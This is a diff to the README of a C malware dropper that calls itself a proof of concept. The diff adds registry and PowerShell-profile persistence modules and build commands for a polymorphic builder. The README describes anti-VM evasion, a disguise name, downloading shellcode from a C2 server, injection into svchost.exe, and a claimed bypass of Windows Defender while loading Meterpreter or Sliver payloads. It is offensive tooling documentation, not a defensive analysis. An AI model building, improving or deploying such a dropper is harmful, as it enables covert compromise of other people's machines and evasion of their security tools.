@@ -24,7 +24,7 @@ This project is a **Proof of Concept (PoC)** of a modular dropper written in C, 
 
 ### 3. Persistence and Control
 - **Identifying Mutex**: Checks for the presence of a unique (encrypted) Mutex to prevent multiple redundant executions on the same host.
-- **Auto-Persistence**: Copies itself into the `%APPDATA%` folder with a legitimate-looking name (`OneDrive_Updater.exe`) and ensures startup at boot via Windows registry.
+- **Modular-Persistence**: Choose between Windows Registry and PowerShell Profiles persistence modules.
 
 ### 4. Process Injection & Networking
 - **Modular Downloader**: Uses WinINet to download the encrypted shellcode/payload from a remote C2 server.
@@ -40,15 +40,16 @@ This project is a **Proof of Concept (PoC)** of a modular dropper written in C, 
 ```text
 .
 ├── src/
-│   ├── main.c           # Entry point and core logic
-│   ├── evasion.c        # Anti-VM, Hashing, XOR, Mutex
-│   ├── network.c        # Payload download manager
-│   ├── injection.c      # Injection logic (Remote Thread)
-│   ├── persistence.c    # Persistence installation and registry
-│   ├── config.h         # Definitions and constants
-│   └── ...              # Header files
+│   ├── main.c             # Entry point and core logic
+│   ├── evasion.c          # Anti-VM, Hashing, XOR, Mutex
+│   ├── network.c          # Payload download manager
+│   ├── injection.c        # Injection logic (Remote Thread)
+│   ├── persistence_reg.c  # Registry persistence module
+│   ├── persistence_ps.c   # PowerShell Profiles persistence module
+│   ├── config.h           # Definitions and constants
+│   └── ...                # Header files
 ├── tools/
-│   ├── malware_mutator.py      # Polymorphic builder and stripping
+│   ├── builder.py              # Polymorphic builder and stripping
 │   ├── stack_string.py         # C Macro generator for Stack String with XOR
 │   ├── string_encryptor.py     # Strings encryptor based on secret key
 │   └── hasher.py               # DJB2 hash generator for APIs
@@ -85,6 +86,13 @@ Run the automated builder to compile the C code, strip metadata, and apply polym
 # Build default (OneDrive_Updater.exe)
 python3 tools/builder.py
 
+# Build in test mode (skips VM and SandBox evasion)
+# You should use this to test the malware in controlled environment
+python3 tools/builder.py --test
+
+# Build selecting persistence module
+python3 tools/builder.py --persistence [reg, ps]
+
 # Build with a custom name
 python3 tools/builder.py --name "CustomName.exe"
 
@@ -110,7 +118,7 @@ Run the dropper on the target machine. Once the sandbox checks and smart delays 
 
 ## 🔬 Testing
 
-The implant was successfully tested on **Windows 11 (23H2)**, bypassing standard Windows Defender signatures for loading Meterpreter (HTTP) shellcode injected into suspended `svchost.exe` processes.
+The implant was successfully tested on **Windows 11 (23H2)** and **Windows 10 (idk)**, bypassing standard Windows Defender signatures for loading Sliver (mTLS) shellcode injected into suspended `svchost.exe` processes.
 
 ---
 
